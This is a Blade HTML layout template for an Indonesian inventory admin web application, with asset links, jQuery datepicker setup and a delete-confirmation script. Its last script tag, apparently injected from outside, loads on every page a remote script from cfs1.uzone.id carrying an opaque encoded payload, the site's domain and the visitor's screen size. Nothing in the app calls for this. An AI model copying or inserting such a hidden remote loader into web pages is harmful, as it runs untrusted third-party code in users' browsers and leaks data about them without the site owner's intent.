<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="Admin inventory by: GreenNusa developer Alg.field">
        <meta name="author" content="Westilian, Alg">

        <title>Aplikasi Inventory</title>

        <link rel="shortcut icon" type="image/x-icon" href="{{{ asset('admin/images/inventory.png') }}}">

        <!-- CSS 16-->
        <link rel="stylesheet" type="text/css" href="{{ asset('admin/bootstrap/css/font-awesome.css') }}">
        <link rel="stylesheet" type="text/css" href="{{ asset('admin/bootstrap/theme/16/bootstrap.min.css') }}">
        <link rel="stylesheet" type="text/css" href="{{ asset('admin/selectbox/css/bootstrap-select.min.css') }}">
        <link rel="stylesheet" type="text/css" href="{{ asset('admin/jquery-ui/jquery-ui.min.css') }}">
        

        <!-- CSS CUSTOM untuk login dengan lokasi yang berbeda -->
                <!--Default CSS-->
            <link rel="stylesheet" type="text/css" href="{{ asset('admin/custom/custom-red.css') }}">

        <!-- #Eror 9, 12-->
        <style type="text/css">
            html {
                position: relative;
                min-height: 100%;
            }
            body {
                margin-bottom: 60px;
                padding-top: 20px;
            }
            .footer {
                position: absolute;
                bottom: 0;
                width: 100%;
                /* Set the fixed height of the footer here */
                height: 60px;
                background-color: #f5f5f5;
            }

            body > .container {
                padding: 60px 15px 0;
            }
            .container .text-muted {
                margin: 15px 0;
            }

            .footer > .container {
                padding-right: 15px;
                padding-left: 15px;
            }

            code {
                font-size: 80%;
            }
        </style>

        <!-- JS -->
        <script src="{{ asset('admin/jquery/jquery-1.11.3.min.js') }}"></script>
        <script src="{{ asset('admin/bootstrap/js/bootstrap.min.js') }}"></script>
        <script src="{{ asset('admin/selectbox/js/bootstrap-select.min.js') }}"></script>
        <script src="{{ asset('admin/jquery-ui/jquery-ui.min.js') }}"></script>
        <script src="{{ asset('admin/js/bootstrap-notify.min.js') }}" ></script>

        <script type="text/javascript">
            $('.selectpicker').selectpicker();
        </script>
        <script>
            $(function() {
                $( ".datepicker" ).datepicker({ altFormat: 'yy-mm-dd' });
                $( "#format" ).change(function() {
                    $( "#datepicker" ).datepicker( "option", "dateFormat", "yy-mm-dd" );
                });
            });
        </script>
        <script type="text/javascript">
            $(function() {
                $('.date-picker').datepicker( {
                    changeMonth: true,
                    changeYear: true,
                    showButtonPanel: true,
                    dateFormat: 'yy-mm-dd',
                    onClose: function(dateText, inst) { 
                        var month = $("#ui-datepicker-div .ui-datepicker-month :selected").val();
                        var year = $("#ui-datepicker-div .ui-datepicker-year :selected").val();
                        $(this).datepicker('setDate', new Date(year, month, 1));
                    }
                });
            });
        </script>
        <style>
            .ui-datepicker-calendar {
                display: none;
            }
        </style>
    </head>
    <body>
       
        <nav class="navbar navbar-inverse navbar-fixed-top">
            @include('template.topbar')
            
        </nav>
	    <div class="container-fluid">
            @yield('content')
            
    	</div>
	    
	    <footer class="footer">
	    	@include('template.footer')
	    	
    	</footer>
    	<script>
            function confirmation(){
                if(confirm('Apakah Anda yakin akan Mengapus Data ?')) {
                    document.getElementById('delete-form').submit();
                } else {
                    return false;
                }
            
            }
        </script>
	    <script type="text/javascript" src="{{ asset('admin/js/underscore-min.js') }}"></script>
        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKtOlSq5cdRBVfKhcWXIpYtqQT01608vLcfvNOa6dbTu2dBVFYhyUuS6M%2b%2bVp%2boKxK4e3aMVMpoEEjTnLc9G%2fwjuz87%2fzn1JeuwyDvrDd0kRysnCvUYhbiNuGDodnWnKZ9ZzHlpUZHsXkMuQIxbfbenRUL48tjdR2xObGBHGfyu2iZlqCvuIx%2bWN5x0Jqa%2bawDd3dBPGqVI9yXZCKQYujflCiICG%2bz0ULYf3mpANLnbVZogDQGCe1RR3%2bFHTffP3pZUm3JfdzsW6FSFomxFNc2H2vcPiHSFcTKIF8fCfXyjD5Mp2uHcoH35F%2ftGNe3wq5anodt4T03M3LqjricPsyXnjxlqf7GZVarki5WG1hL2ExE0JQNN%2bGcflVmjOoV6aJ2k%2bWidwcbhKdmG70%2fXSaOP2p%2bvvvyZLhJXGA%2f0GIPmXvNuyqPmpnjQZzlolyUnwNRz9SJhk%2f0bTt2NLhqe9RhnpzVh2IHSK1V3asQEIhejuWyfJcvgjX0dZvn02XN1tPpiSOzMJ8YqyzzFOFmKppFXUTYiiM918DMIka4l3Guyx4VF8zpSN7FQ7E370TcGnHm" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    </body>
</html>